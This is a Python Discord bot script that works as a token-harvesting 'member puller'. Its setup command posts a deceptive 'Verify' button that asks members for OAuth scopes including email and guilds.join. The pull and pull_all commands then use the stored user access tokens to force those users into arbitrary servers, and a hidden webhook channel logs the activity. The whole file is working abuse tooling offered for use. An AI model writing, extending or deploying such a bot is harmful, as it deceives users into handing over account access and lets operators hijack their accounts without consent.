import discord, json, requests, os
from pystyle import *
from discord import *
from discord.ui import *
from discord.ext import commands, tasks

def get_user_data(token):
    headers = {
        "Authorization" : f"Bearer {token}"
    }
    r = requests.get(f"https://discord.com/api/v8/users/@me", headers = headers)
    return r.json()

def pull_to_guild(bot_token, token, guild_id, id):
    
    data = {
        "access_token" : token
    }
    headers = {
        "Authorization" : f"Bot {bot_token}",
        'Content-Type': 'application/json'

    }
    r = requests.put(f'https://discord.com/api/v8/guilds/{guild_id}/members/{id}', headers=headers, json=data).json()
    return r

os.system('cls')
with open("saved.json", "r+") as a:
    print("[...] Checking for tokens")
    aa = json.load(a)
    if aa['config']['bot_token'] == "":
        token = input(f"{Colors.light_blue}[>] {Colors.blue}Bot token: ")

    else:
        token = aa['config']['bot_token']
    role_id = input(f"{Colors.light_blue}[>] {Colors.blue}Enter Role id: ")
    client_id = input(f"{Colors.light_blue}[>] {Colors.blue}Enter client id: ")
    url_hosted = input(f"{Colors.light_blue}[>] {Colors.blue}Enter URL you're hosting with if testing locally type (http://localhost:8080): ")
bot = commands.Bot(command_prefix="-", help_command=None, intents=discord.Intents.all())

@bot.command()
async def pull(ctx, token2, guild_id, uid):
    try:
        a = pull_to_guild(token, token2, guild_id, uid)

        await ctx.send(embed=Embed(title="Pulled user", description=f"Sucessfully added the user to the guild!"))
    except:
        await ctx.send(embed=Embed(title="Failed to pull user", description=f"This didn't seem to work :(!"))

@bot.command()
async def pull_all(ctx, guild_id):
    failed = []
    allowed = []
    with open("saved.json", "r+") as f:
        ff = json.load(f)
        array = ff['array']
        for x in array:
            info = get_user_data(x)
            id = str(info['id'])
            try:
                pull_to_guild(token, x, guild_id, id)
                allowed.append(x)
            except Exception as e:
                failed.append(x)
        await ctx.send(embed=Embed(title="Pull summary", description=f"**Auth tokens pulled to guild:** {allowed}\n**Failed to pull:** {failed}", color=discord.Color.blurple()))

         


@bot.command()
async def setup(ctx, channel:int = None):
    if channel == None:
        button = Button(
            style=ButtonStyle.link,
            label="Verify",
            url=f"https://discord.com/api/oauth2/authorize?client_id={client_id}&redirect_uri={url_hosted}/callback&response_type=code&scope=identify%20guilds%20email%20guilds.join"
        )
        guild = ctx.message.guild
        a = await guild.create_text_channel("Verify")
        await a.set_permissions(guild.default_role, view_channel=True)
        role = guild.get_role(int(role_id))
        await a.set_permissions(role, view_channel=False)

        b = await guild.create_text_channel("Log")
        await b.set_permissions(guild.default_role, view_channel=False)
        b1 = b.id
        vie = View()
        vie.add_item(button)
        with open("saved.json", "r+") as f:
            ff = json.load(f)
            b = await b.create_webhook(name="GoAuth")
            print(b)
            ff['log'] = b.url
            ff['config'] = {
            
            "guild":guild.id,
            "bot_token":token
            
            }
            print(b.url)
            f.truncate(0)
            f.seek(0)
            json.dump(ff, f, indent=4)
        await a.send(embed=Embed(title="Verify", description="Click the button below to verify in this server!"), view=vie)

    await ctx.reply(embed=Embed(title=f"Created", description=f"Sucessfully set up verification in <#{a.id}>! All logs will be sent to <#{b1}>"))
bot.run(token)
